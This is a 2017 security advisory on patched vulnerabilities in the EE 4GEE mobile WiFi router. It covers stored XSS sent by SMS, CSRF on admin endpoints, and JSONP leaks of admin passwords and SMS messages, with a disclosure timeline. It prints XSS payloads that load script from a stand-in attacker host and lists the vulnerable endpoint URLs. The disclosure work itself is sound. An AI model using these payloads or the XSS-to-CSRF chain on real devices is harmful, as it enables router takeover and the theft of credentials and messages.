

EE 4GEE Wireless Router - Multiple Security Vulnerabilities Advisory
-------------------------------------------------
<b>Hardware Version/Model:</b> 4GEE WiFi MBB (EE60VB-2AE8G83).
<br>
<b>Vulnerable Software Version:</b> EE60_00_05.00_25.
<br>
<b>Patched Software Version:</b> EE60_00_05.00_31.
<br>
<b>Product URL:</b> https://shop.ee.co.uk/dongles/pay-monthly-mobile-broadband/4gee-wifi/details
<br>
<b>Proof of Concept Writeup:</b> https://blog.jameshemmings.co.uk/2017/08/24/ee-4gee-mobile-wifi-router-multiple-security-vulnerabilities-writeup/#more-276
<br>
<b>Disclosure Timeline:</b>
<br>
27th July, 2017 at 21:32 GMT. Email sent with technical vulnerability information and PoC.
<br>
27th July, 2017 at 22:00 GMT. Response from EE devices manager, confirming receipt of PoC.
<br>
31th July, 2017 at  18:47 GMT. Update from vendor, patches being developed for reported issues.
<br>
1st August, 2017 at 10:43 GMT. Reply sent to vendor.
<br>
10th August, 2017 at 10:32 GMT. Update from vendor, patches still being developed.
<br>
18th August, 2017 at 12:11 GMT. Email sent to vendor asking for update/ETA.
<br>
18th August, 2017 at 12:15 GMT. Response from vendor, updates to be released on Monday.
<br>
18th August, 2017 at 12:30 GMT. Reply sent to vendor with device IMEI for online update process.
<br>
22nd August, 2017 at 15:54 GMT. Response from vendor, beta firmware released to verify  changes.
<br>
23rd August, 2017 at 21:29 GMT. Reply sent to vendor, vulnerabilities successfully patched.
<br>
24th August, 2017 at 09:32 GMT. Response from vendor, patch publicly released to customers.
<br>
24th August, 2017 at 12:00 GMT. Full disclosure via Blog.

Stored Cross Site Scripting (XSS) - SMS Messages:
-------------------------------------------------
<b>Attack Type:</b> Remote
<br>
<b>Impact:</b> Code Execution
<br>
<b>Affected Components:</b><br>http://ee.mobilebroadband/default.html#sms/smsList.html?list=inbox<br>
http://ee.mobilebroadband/getSMSlist?rand=0.19598614685224347
<br>
<br>
<b>Attack Vectors:</b> An attacker can exploit the vulnerability by sending a remote SMS message to the device with an XSS payload such as "<script src=http://payload.js</script>" which is executed upon the user viewing the SMS message within the admin panel "SMS Inbox" functionality. Additionally, self-XSS can be achieved by creating an XSS payload from the device its self within a text message, which could be chained with other vulnerabilities such as CSRF.
<br>
<br>
<b>Vulnerability Description:</b>The 4GEE Mobile WiFi Router is vulnerable to Stored Cross Site Scripting (XSS) within the "sms_content" parameter returned to the application's SMS Inbox webpage by the "getSMSlist" POST request, due to a lack of input validation and/or encoding. This exploit can be triggered by remotely sending an SMS message containing any XSS payload such as '"><script src=http://attacker.tld/r.js></script>' which upon clicking on the text message within the web application is successfully executed. 
<br>
<br>
Additionally, due to the other vulnerabilities identified within this device, such vulnerability can be chained with Cross Site Request Forgery (CSRF) using the Stored XSS payload to send an JavaScript XHR POST request to the "uploadSettings" webpage containing binary configuration data, allowing for total modification of device settings by an attacker.

CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N/E:H/RL:O/RC:C (CVSS V3: 7.1 - High).

<b>Author:</b> James Hemmings - security@jameshemmings.co.uk
<br>
<b>Reference(s)</b>:
<br>
[1] https://blog.jameshemmings.co.uk/2017/08/21/ee-4gee-mobile-wifi-router-multiple-security-vulnerabilities

Cross Site Request Forgery (CSRF) - Multiple:
-------------------------------------------------
<b>Attack Type:</b> Remote
<br>
<b>Impact:</b> Code Execution
<br>
<b>Affected Components:</b>
<br>
http://192.168.1.1/goform/AddNewProfile?rand=0.376065695742409
<br>
http://192.168.1.1/goform/setWanDisconnect?rand=0.6988130822240772
<br>
http://192.168.1.1/goform/setSMSAutoRedirectSetting?rand=0.9003361879232169
<br>
http://192.168.1.1/goform/setReset?rand=0.021764703082234105
<br>
http://192.168.1.1/goform/uploadBackupSettings
<br>
<br>
<b>Attack Vectors:</b> An attacker could attempt to trick users into accessing malicous CSRF payload URLs, which would allow an attacker to execute privileged functions such as device reset, device reboot, internet connection and disconnection, SMS message redirection and binary configuration file upload, which would allow modification of all device settings. Addtionally, this exploit can be chained together using other vulnerabilities discovered to be remotely exploited over SMS, using Stored Cross Site Scripting (XSS).
<br>
<br>
<b>Vulnerability Description:</b> The 4GEE Mobile WiFi Router is vulnerable to multiple Cross Site Request Forgery (CSRF) vulnerabilities within various router administration webpages, due to the lack of robust request verification tokens within requests. An attacker could persuade an authenticated user to visit a malicous website using phishing and/or social engineering techniques to send an CSRF request to the web application, thus executing the privileged function as the authenticated user. In this case, due to the lack of authentication on certain privileged functions, authentication may not be neccessary.
<br>
<br>
The following webpages were identified to be vulnerable to Cross Site Request Forgery (CSRF) attacks:
<br>
<br>
AddNewProfile [2].
<br>
setWanDisconnect [3].
<br>
setSMSAutoRedirectSetting [4].
<br>
setReset [5].
<br>
uploadBackupSettings [6].
<br>
<br>
CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N/E:H/RL:O/RC:C (CVSS V3: 6.8 - Medium).
<br>
<br>
<b>Author:</b> James Hemmings - security@jameshemmings.co.uk
<br>
<b>Reference(s):</b>
<br>
[1] https://blog.jameshemmings.co.uk/2017/08/21/ee-4gee-mobile-wifi-router-multiple-security-vulnerabilities
<br>
[2] https://github.com/JamesIT/vuln-advisories-/blob/master/EE-4GEE-Multiple-Vulns/CSRF/AddProfileCSRFXSSPoc.html
<br>
[3] https://github.com/JamesIT/vuln-advisories-/blob/master/EE-4GEE-Multiple-Vulns/CSRF/CSRFInternetDCPoC.html
<br>
[4] https://github.com/JamesIT/vuln-advisories-/blob/master/EE-4GEE-Multiple-Vulns/CSRF/CSRFPocRedirectSMS.html
<br>
[5] https://github.com/JamesIT/vuln-advisories-/blob/master/EE-4GEE-Multiple-Vulns/CSRF/CSRFPocResetDefaults.html
<br>
[6] https://github.com/JamesIT/vuln-advisories-/blob/master/EE-4GEE-Multiple-Vulns/uploadBinarySettingsCSRFPoC.html
<br>

JSONP Sensitive Information Disclosure - Multiple
-------------------------------------------------
<b>Attack Type:</b> Remote
<br>
<b>Impact:</b> Information Disclosure
<br>
<b>Affected Components:</b> 
<br>
http://192.168.1.1/goform/getPasswordSaveInfo
<br>
http://192.168.1.1/goform/getSingleSMSReport?rand=0.133713371337
<br>
http://192.168.1.1/goform/getSingleSMS?sms_id=1&rand=0.133713371337
<br>
http://192.168.1.1/goform/getSMSStoreState
<br>
http://192.168.1.1/goform/getSMSAutoRedirectSetting
<br>
http://192.168.1.1/goform/getSysteminfo
<br>
http://192.168.1.1/goform/getUsbIP?rand=0.13371337
<br>
<br>
<b>Attack Vectors:</b> An attacker on the local network could escalate privileges from unauthenticated user, to authenticated administrative user by accessing the saved admin credentials within the JSONP endpoint. Additionally, an attacker could access network configuration data and SMS messages without authentication. 
<br>
<br>
<b>Vulnerability Description:</b> The 4GEE Mobile WiFi Router is vulnerable to multiple JSONP information disclosure vulnerabilities within various endpoints which retrieve and/or set data. The JSONP endpoints allow for unauthenticated information disclosure of sensitive configuration data, settings, administration passwords and SMS messages, due to the lack of robust and effective access control. An attacker could view such unauthenticated endpoints via the local WiFi network to gain access to the administration credentials, router configuration and/or SMS messages.
<br>
<br>
CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:H/RL:O/RC:C (CVSS V3: 8.1 - High).
<br>
<br>
<b>Author:</b> James Hemmings - security@jameshemmings.co.uk
<br>
<b>Reference(s):</b>
<br>
[1] https://blog.jameshemmings.co.uk/2017/08/21/ee-4gee-mobile-wifi-router-multiple-security-vulnerabilities
<br>
<br>

Disclaimer
-------------------------------------------------
The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.
